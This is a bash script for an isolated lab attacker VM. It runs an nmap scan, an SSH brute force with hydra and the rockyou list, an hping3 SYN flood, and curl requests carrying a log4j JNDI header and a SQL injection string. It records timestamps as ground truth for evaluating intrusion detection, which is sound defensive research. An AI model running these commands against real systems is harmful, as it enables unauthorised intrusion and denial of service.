#!/usr/bin/env bash
# ---------------------------------------------------------------------------
# Kali attacker VM (192.168.56.30) — run the four attack campaigns against the
# lab victim, recording the REAL attacker IP and UTC start/end of each so the
# ground truth is measured, not guessed.
#
# Usage:  sudo bash lab/run_attacks.sh <VICTIM_IP> [ssh-user] [wordlist]
#
# ⚠️ LAB ONLY. Run exclusively against your own isolated host-only victim, in
#    line with the Computer Misuse Act 1990. Payloads are harmless (EICAR /
#    signature triggers); no real exploitation is required to evaluate detection.
# ---------------------------------------------------------------------------
set -uo pipefail
TARGET="${1:?usage: run_attacks.sh <victim-ip> [ssh-user] [wordlist]}"
SSH_USER="${2:-root}"
WORDLIST="${3:-/usr/share/wordlists/rockyou.txt}"
ATTACKER="$(ip -4 -o addr show | awk '!/ lo /{print $4}' | cut -d/ -f1 | head -1)"

# rockyou is shipped gzipped on Kali — unpack on demand.
if [ ! -f "$WORDLIST" ] && [ -f "${WORDLIST}.gz" ]; then
  echo "[*] Decompressing $(basename "${WORDLIST}.gz")…"; gunzip -k "${WORDLIST}.gz"
fi

echo "Target=$TARGET  Attacker=$ATTACKER"
read -rp "Confirm $TARGET is YOUR isolated lab victim and you are authorised [type yes]: " ok
[ "$ok" = "yes" ] || { echo "Aborted."; exit 1; }

OUT="attack_$(date -u +%Y%m%dT%H%M%SZ)"; mkdir -p "$OUT"; cd "$OUT"
MAN="run_manifest.json"; echo "[]" > "$MAN"
nowu(){ date -u +%Y-%m-%dT%H:%M:%S.000+0000; }
record(){ # type tool logfile start end
  python3 - "$MAN" "$1" "$ATTACKER" "$TARGET" "$4" "$5" "$2" "$3" <<'PY'
import json, sys
man, typ, src, dst, start, end, tool, log = sys.argv[1:9]
d = json.load(open(man))
d.append({"attack_type": typ, "source_ip": src, "target_ip": dst,
          "start_time": start, "end_time": end, "tool": tool, "log_file": log})
json.dump(d, open(man, "w"), indent=2)
PY
}

echo "[1/4] Scan (nmap)…"
s=$(nowu); nmap -sS -sV -p- -T4 "$TARGET" | tee nmap_scan.txt; e=$(nowu)
record "Scan" nmap nmap_scan.txt "$s" "$e"; sleep 30

echo "[2/4] Brute force (hydra/ssh)…"
s=$(nowu); hydra -l "$SSH_USER" -P "$WORDLIST" -t 4 "ssh://$TARGET" | tee hydra_ssh.txt || true; e=$(nowu)
record "Brute Force" hydra hydra_ssh.txt "$s" "$e"; sleep 30

echo "[3/4] DoS (hping3 SYN flood, ~90s)…"
s=$(nowu); timeout 90 hping3 -S --flood -p 80 "$TARGET" | tee hping3_dos.txt || true; e=$(nowu)
record "DoS" hping3 hping3_dos.txt "$s" "$e"; sleep 30

echo "[4/4] Exploit delivery + EICAR…"
s=$(nowu)
{ curl -s "http://$TARGET/" -H 'User-Agent: ${jndi:ldap://127.0.0.1/a}' -o /dev/null
  curl -s "http://$TARGET/?id=1%27%20OR%20%271%27=%271" -o /dev/null
  curl -s "http://$TARGET/eicar.com" -o /dev/null
  echo "sent: log4j header, sqli, eicar fetch"
} | tee exploit.txt || true
e=$(nowu); record "Exploit Delivery" curl exploit.txt "$s" "$e"

# Optional, interactive — uncomment to deliver a real exploit module from Metasploit
# against the lab victim only (the proposal lists Metasploit):
#   msfconsole -q -x "use exploit/multi/http/...; set RHOSTS $TARGET; run; exit"

echo
echo "[✓] Done. Run folder: $(pwd)"
echo "Bring this folder back to the repo and run:"
echo "    python lab/build_ground_truth.py --manifest $(pwd)/$MAN --out data/ground_truth.json"
